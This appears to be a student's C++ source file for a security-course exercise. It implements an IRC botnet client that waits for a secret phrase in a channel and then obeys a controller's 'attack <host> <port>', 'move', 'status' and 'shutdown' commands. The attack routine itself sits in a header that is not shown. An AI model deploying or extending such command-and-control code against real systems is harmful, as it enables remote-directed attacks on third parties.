// File: bot.cpp
// Desc: Handles Server-side functionality for secure data transfer with client program.
// Written by: James Cote
// ID: 10146559
// Tutorial: T01

// Includes
#include "connection.h"

// Namespace
using namespace std;

// Global
connection* pConnection;

// Defines
#define NUM_ARGS 5
#define NUM_MOVE_ARGS 3
#define NUM_ATK_ARGS 2
#define HOSTNAME_ARG 1
#define PORT_ARG 2
#define CHANNEL_ARG 3
#define PHRASE_ARG 4
#define MAX_BUFFER_SIZE 256

// Message Identifiers
const char sPRIVATEMSG[] = { "PRIVMSG" };
const char sATTACK[] = { "attack" };
const char sSTATUS[] = { "status" };
const char sMOVE[] = { "move" };
const char sSHUTDOWN[] = { "shutdown" };
const char sPREFIX[] = { "bot" };

// Function Declarations
bool handleMessage( const string& sMsg, const string& sPhrase );
void handleMove( const string& sHostName, int iPort, 
				 const string& sChannel, const string& sControllerName );
bool handleCommand( const string& sCommandString, string sControllerName );

// Main
int main( int iArgC, char* pArgs[] )
{
	// Local Variables
	int iPort;
	string sPhrase, sHostName, sChannel;
	bool bShutdown = false;
	string sMessage;
	int iBytesRead = 0;

	// Check Arguments
	if ( iArgC < NUM_ARGS )
	{
		cout << "Not enough arguments: ./bot <hostname> <port> <channelname> <secret-phrase>\n";
		return 1;
	}

	// Grab Arguments
	iPort = atoi( pArgs[ PORT_ARG ] );
	sPhrase.assign( pArgs[ PHRASE_ARG ] );
	sHostName.assign( pArgs[ HOSTNAME_ARG ] );
	sChannel.assign( pArgs[ CHANNEL_ARG ] );

	// init input handler.
	pConnection = new connection( sHostName, iPort, sChannel );

	// Established socket
	if ( pConnection->isConnected() )
	{
		// Connect to IRC server (using IRC protocol)
		pConnection->connectToServer( sPREFIX );

		// Loop goes here.
		while ( !bShutdown )
		{
			// Read Message from the Server and store in String
			iBytesRead = pConnection->getNextLine( sMessage );

			if ( iBytesRead > 0 )
			{
				// Handle the Message.
				bShutdown = handleMessage( sMessage, sPhrase );
			}
		}
	}

	// Clean up
	delete pConnection;

	return 1;
}

bool handleMessage( const string& sMsg, const string& sPhrase )
{
	// Local Variables
	bool bReturnValue = false;
	vector< string > sSplitMsgs;
	vector< string > sMessageDefs;
	
	pConnection->splitString( sMsg, ':', sSplitMsgs );

	// Handle Ping
	if( !sSplitMsgs[0].compare( "PING " ) )
		pConnection->Socket_Write( "PONG :" + sSplitMsgs[ 1 ] + "\r\n" );
	else
	{
		// Break up and check Message Parameters
		pConnection->splitString( sSplitMsgs[ 0 ], ' ', sMessageDefs );

		// General Message received? check for Secret Phrase and handle command if any
		if ( !sMessageDefs[ 1 ].compare( sPRIVATEMSG ) && '#' == sMessageDefs[ 2 ][ 0 ] )	// Handle Potential Message
			if ( string::npos != sSplitMsgs[ 1 ].find( sPhrase ) )							// Was the Secret Phrase found?
				bReturnValue = handleCommand( sSplitMsgs[ 1 ], sSplitMsgs[ 0 ].substr( 0, sSplitMsgs[ 0 ].find_first_of( '!' ) ) /*Controller Name*/ );
	}
	
	return bReturnValue;
}

bool handleCommand( const string& sCommandString, string sControllerName )
{
	// Local Variables
	bool bReturnValue = false;
	vector< string > sSplitCommand;
	
	// Split up command line arguments.
	pConnection->splitString( sCommandString, ' ', sSplitCommand );

	// Move through to list of message variables to find a command.
	for ( vector< string >::iterator iter = sSplitCommand.begin();
		  iter != sSplitCommand.end();
		  ++iter )
	{
		if ( !iter->compare( sSTATUS ) )														// Handle Status
		{
			pConnection->sendStatusMsg( sControllerName );
			break;
		}
		else if ( !iter->compare( sATTACK ) && (iter + NUM_ATK_ARGS != sSplitCommand.end()) )	// Handle Attack
		{
			if ( pConnection->attack( *(iter + 1), atoi( (iter + 2)->c_str() ) ) )
				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " :success\r\n" );
			else
				pConnection->Socket_Write( "PRIVMSG " + sControllerName + " :failure\r\n" );
			break;
		}
		else if ( !iter->compare( sMOVE ) && (iter + NUM_MOVE_ARGS != sSplitCommand.end()) )	// Handle Move
		{
			handleMove( *(iter + 1), atoi( (iter + 2)->c_str() ), *(iter + 3), sControllerName );
			break;
		}
		else if ( !iter->compare( sSHUTDOWN ) )													// Handle Shutdown
		{
			pConnection->Socket_Write( "PRIVMSG " + sControllerName + " :success\r\n" );
			bReturnValue = true;
			break;
		}
	}

	return bReturnValue;
}

// Handle Move command from server.
void handleMove( const string& sHostName, int iPort, const string& sChannel, const string& sName )
{
	// Local Variables - try to set up the new connection
	connection* pNewConnection = new connection( sHostName, iPort, sChannel );

	// Connection was successful?
	if ( pNewConnection->isConnected() )
	{
		// Send success message and switch connection to new connection
		pNewConnection->connectToServer( sPREFIX );
		pConnection->Socket_Write( "PRIVMSG " + sName + " :success\r\n" );
		delete pConnection;
		pConnection = pNewConnection;
	}
	else
	{
		// delete failed connection and send failure message.
		delete pNewConnection;
		pConnection->Socket_Write( "PRIVMSG " + sName + " :failure\r\n" );
	}
}